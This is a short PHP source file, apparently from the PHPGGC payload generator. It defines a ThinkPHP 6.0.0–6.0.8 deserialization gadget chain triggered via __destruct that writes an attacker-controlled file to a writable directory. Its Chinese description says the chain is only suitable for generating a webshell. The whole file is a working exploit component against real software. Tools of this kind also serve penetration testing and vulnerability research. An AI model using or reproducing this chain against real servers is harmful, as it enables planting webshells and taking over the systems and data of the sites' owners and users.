<?php

namespace GadgetChain\ThinkPHP;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '6.0.0 <= 6.0.8';
    public static $vector = '__destruct';
    public static $author = 'AFKL';
    public static $information = '只能在任意可写目录下生成文件名为 8bfc8af07bca146c937f283b8ec768d4.php 的文件，同时会文件内有脏数据。仅适合生成 webshell。';

    public function generate(array $parameters)
    {
        $path = pathinfo($parameters['remote_path'])['dirname'].'/';
        $data = $parameters['data'];
        return new \think\filesystem\CacheStore($path, $data);
    }
}